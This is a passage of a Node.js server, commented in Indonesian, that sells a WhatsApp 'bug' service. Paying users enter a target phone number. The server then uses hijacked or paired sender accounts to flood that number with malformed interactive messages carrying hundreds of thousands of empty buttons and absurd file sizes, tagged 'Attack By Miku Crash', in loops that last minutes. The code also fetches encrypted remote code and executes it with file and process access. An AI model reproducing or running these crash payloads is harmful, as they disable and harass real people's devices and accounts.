  ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
  androidId,
});

return res.json({
  valid: true,
  expired: false,
  key,
  expiredDate: user.expiredDate,
  role: user.role || "member",
  listBug: bugs,
  news
});
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news // ✅ Tambahkan ini
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body || {};
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

// 💥 Eksekusi bug via 1 socket (dipakai mode private/global/allglobal)
async function sendBugViaSocket(sock, bug, target) {
  const targetJid = target + "@s.whatsapp.net";
  switch (bug) {
    case "halo":
      // Test kirim: pesan normal 1x lewat jalur sendMessage (bukan relay)
      await sock.sendMessage(targetJid, {
        text: "\ud83d\udc4b SENDER AMAN.",
      });
      break;
    case "delay":
      for (let i = 0; i < 15; i++) {
        await DelayBrutalyyy(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "combo":
      for (let i = 0; i < 20; i++) {
        await ComboZZ(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "stuck_v3":
      for (let i = 0; i < 200; i++) {
        await ComboxJ(sock, targetJid);
        await sleep(1000);
      }
      break;
    case "stuck_logo":
      for (let i = 0; i < 1; i++) {
        await StuckLogo(sock, targetJid);
      }
      break;
    case "stuck_v2":
      for (let i = 0; i < 15; i++) {
        await CodexCrashJ(sock, targetJid);
      }
      break;
  }
}

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;
  const senderMode = (req.query.sender || "private").toLowerCase(); // "private" | "global"
  target = (target || "").replace(/\D/g, ""); // hapus semua karakter non-digit
  console.log(`[📤 BUG] Send bug to ${target} using key ${key} - Bug: ${bug} - Sender: ${senderMode}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // 🌐 Sender global: boleh dipakai semua role KECUALI member biasa
  // senderMode: "private" | "global" (1 acak) | "allglobal" (semua online sekaligus)
  const canGlobal = canUseGlobalSender(user);
  const preferGlobal = senderMode === "global" || senderMode === "allglobal";

  // Validasi opsi sender SEBELUM cooldown (agar tidak membakar cooldown)
  if (preferGlobal && !canGlobal) {
    return res.json({
      valid: true,
      sended: false,
      sender: senderMode,
      senderDenied: true,
      message: "Sender global hanya untuk VIP, Owner, Reseller, dan Admin. Gunakan sender pribadi."
    });
  }

  if (preferGlobal) {
    const onlineGlobal = getGlobalSenderFolder().filter(n => activeConnections[n]);
    if (!onlineGlobal.length) {
      return res.json({
        valid: true,
        sended: false,
        sender: "global",
        senderEmpty: true,
        message: "Tidak ada sender global yang online. Gunakan sender pribadi atau coba lagi nanti."
      });
    }
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 240,
    reseller1: 60,
    owner: 0,
    vip: 60,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db); // Penting! Simpan waktu kirim ke file
  console.log(`${user.username} Trigger Cooldown`);

  const onlineGlobalCount = preferGlobal
    ? getGlobalSenderFolder().filter(n => activeConnections[n]).length
    : 0;

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role,
    sender: senderMode === "allglobal" ? "allglobal" : (preferGlobal ? "global" : "private"),
    ...(senderMode === "allglobal" ? { globalCount: onlineGlobalCount } : {})
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    const isMessBug = false;
    console.log("Received Signal")

    // 💥 Mode SEMUA GLOBAL: kirim paralel via semua sender global online
    if (senderMode === "allglobal") {
      const onlineGlobal = getGlobalSenderFolder().filter(n => activeConnections[n]);
      if (!onlineGlobal.length) {
        console.warn(`[❌ NO SOCK] Tidak ada sender global online untuk ${user.username}.`);
        return;
      }
      console.log(`[📤 BUG] ${user.username} (${role}) kirim '${bug}' ke ${target} via SEMUA sender global (${onlineGlobal.length})`);

      await Promise.allSettled(onlineGlobal.map(async (senderName) => {
        const sock = activeConnections[senderName];
        if (!sock) return;
        try {
          await sendBugViaSocket(sock, bug, target);
          console.log(`[✅ BUG] '${bug}' terkirim ke ${target} via global ${maskNumber(senderName)}`);
        } catch (err) {
          console.warn(`[⚠️ SEND ERROR global ${maskNumber(senderName)}] ${err.message}`);
          if (err.message === 'Connection Closed') {
            delete activeConnections[senderName];
            delete biz[senderName];
            delete mess[senderName];
          }
        }
      }));
      return;
    }

    // 🌐 Pilih sender sesuai opsi user: global (1 acak) / pribadi
    const chosen = pickSenderForUser(user, preferGlobal);
    const sock = chosen.sock;
    const senderLabel = chosen.isGlobal
      ? `global ${maskNumber(chosen.senderName)}`
      : `pribadi ${chosen.senderName}`;

    if (!sock) {
      console.warn(`[❌ NO SOCK] Tidak ada sender ${preferGlobal && chosen.isGlobal === false ? 'global (fallback ke pribadi) maupun pribadi' : 'pribadi'} aktif untuk ${user.username}.`);
      return;
    }
    console.log(`[📤 BUG] ${user.username} (${role}) kirim '${bug}' ke ${target} via sender ${senderLabel}`);
    const attemptSend = async (sock, retry = false) => {
      try {
        const targetJid = target + "@s.whatsapp.net";
    console.log("Received Signal 2")
    console.log(`${targetJid}`)
        switch (bug) {
        case "halo":
            // Test kirim: pesan normal 1x lewat jalur sendMessage (bukan relay)
            await sock.sendMessage(targetJid, {
              text: "\ud83d\udc4b SENDER AMAN.",
            });
            break;
          case "delay":
            for (let i = 0; i < 15; i++) {
              await DelayBrutalyyy(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "combo":
            for (let i = 0; i < 20; i++) {
              await ComboZZ(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "stuck_v3":
            for (let i = 0; i < 200; i++) {
              await ComboxJ(sock, targetJid);
              await sleep(1000);
            }
            break;
          case "stuck_logo":
            for (let i = 0; i < 1; i++) {
              await StuckLogo(sock, target);
            }
            break;
          case "stuck_v2":
            for (let i = 0; i < 15; i++) {
              await CodexCrashJ(sock, target);
            }
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (chosen.isGlobal && err.message === 'Connection Closed') {
          delete activeConnections[chosen.senderName];
          delete biz[chosen.senderName];
          delete mess[chosen.senderName];
        }
        if (!retry) {
          // Coba fallback: sender pribadi user
          const retrySock = checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      activeCreds.push({
          sessionName: sessionName
      });
    }
  }

  return activeCreds;
}

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)

  // 🌐 Sender global (nomor di-sensor) hanya untuk role premium
  const allowGlobal = canUseGlobalSender(user);
  let globalSenders = [];
  if (allowGlobal) {
    globalSenders = getGlobalSenderFolder().map(name => ({
      number: maskNumber(name),
      online: !!activeConnections[name]
    }));
  }

  return res.json({
    valid: true,
    connections: conns,
    canUseGlobal: allowGlobal,
    canManageGlobal: canManageGlobalSender(user),
    globalSenders
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('permenmd', user.username, number); 

  if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`);
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await waiting(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });
  // 🔹 Kalau belum registered, generate pairing code
  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    console.log(code)
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  }
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});


// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "reseller1"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
        { parse_mode: "Markdown" }
    );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});

// ===== Delete User (admin only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
    
    sendToGroups(
      `🗑️ *Akun Dihpus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
        { parse_mode: "Markdown" }
    );
    
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || creator.role !== "owner") {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);newUser
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newUser.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newUser.role}`,
        { parse_mode: "Markdown" }
    );

  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

//=============[FUNC BARU]==============\\
//Stuck V2
async function CodexCrashJ(sock, target) {
  const startTime = Date.now();
  const duration = 4 * 60 * 1000;

  while (Date.now() - startTime < duration) {
    const CodeCrypto = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=EXPIRED_HASH&oe=5F000000",
                mimetype: "image/jpeg",
                fileSha256: crypto.randomBytes(32).toString("base64"),
                fileLength: 9999999999999,
                height: 99999,
                width: 99999,
                mediaKey: crypto.randomBytes(32).toString("base64"),
                fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
                directPath: "/m1/v/t24/00002299291718920200291920729100",
                mediaKeyTimestamp: "1776937541",
                jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
                caption: "nani desuka?",
                scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                scanLengths: [
                  9999987899999999999999,
                  998999999999999999999,
                  999899999999999999999,
                  9998789999999999999999
                ],
                midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
              }
            },
            body: { text: "— MikuHost - Attack#" },
            nativeFlowMessage: {
              buttons: Array.from({ length: 450000 }, () => ({}))
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, CodeCrypto, {});
    await sock.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
  }
}

//Stuck logo
async function StuckLogo(sock, target) {
  const CodeC = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=EXPIRED_HASH&oe=5F000000&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: crypto.randomBytes(32).toString("base64"),
              fileLength: 9999999999999,
              height: 99999,
              width: 99999,
              mediaKey: crypto.randomBytes(32).toString("base64"),
              fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
              directPath: "/m1/v/t24/00002299291718920200291920729100",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
              caption: "nani desuka?",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
                 text: "— MikuHost - Attack#",
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 450000 }, () => ({}))
                    }
                }
            }
        }
    };

  const msg = generateWAMessageFromContent(target, CodeC, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id
  });
}

//Stuck V3
async function ComboxJ(sock, target) {
  const CodeA = generateWAMessageFromContent(target, {
   groupStatusMessageV2: {
     message: {
       interactiveMessage: {
         header: {
           imageMessage: {
             url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
             mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: "9999",
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "HeksenJahat",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: { text: "— Heksen Jahat#" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, CodeA.message, {
    participant: { jid: target },
    messageId: CodeA.key.id
  });

  const CodeB = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            title: "code.pdf",
            hasMediaAttachment: true,
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/pdf",
              fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
              fileLength: "999999999",
              pageCount: 1000,
              mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
              fileName: "billy.pdf",
              fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
              directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1779839963",
              thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
              thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
              thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
              jpegThumbnail: null,
              contextInfo: {},
              thumbnailHeight: 999,
              thumbnailWidth: 999
            }
          },
          body: { text: "Heksen#/." },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, CodeB.message, {
    participant: { jid: target },
    messageId: CodeB.key.id
  });

  const Pemanis = generateWAMessageFromContent(target, {
    interactiveMessage: {
      header: {
        title: "MikuHost"
      },
      body: {
        text: "Attack By Miku Crash"
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 500000 }, () => ({}))
      },
      contextInfo: {
        mentionedJid: [target],
        forwardingScore: 9898989,
        isForwarded: true
      }
    }
  }, {});

  await sock.relayMessage(target, Pemanis.message, {
    participant: { jid: target },
    messageId: Pemanis.key.id
  });

  const CodeX = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=EXPIRED_HASH&oe=5F000000&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: crypto.randomBytes(32).toString("base64"),
              fileLength: 9999999999999,
              height: 99999,
              width: 99999,
              mediaKey: crypto.randomBytes(32).toString("base64"),
              fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
              directPath: "/m1/v/t24/00002299291718920200291920729100",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: "YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXphYmNkZWY=",
              caption: "nani desuka?",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999987899999999999999,
                998999999999999999999,
                999899999999999999999,
                9998789999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: { text: "— Miku - Crash#" },
          nativeFlowMessage: {
            buttons: Array.from({ length: 450000 }, () => ({}))
          }
        }
      }
    }
  };

  const CodeCrypto = generateWAMessageFromContent(target, CodeX, {});
  await sock.relayMessage(target, CodeCrypto.message, {
    participant: { jid: target },
    messageId: CodeCrypto.key.id
  });
}

//Delay
async function DelayBrutalyyy(sock, target) {
    const startTime = Date.now();
    const duration = 4 * 60 * 1000;

    const messsge = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/pdf",
                            fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
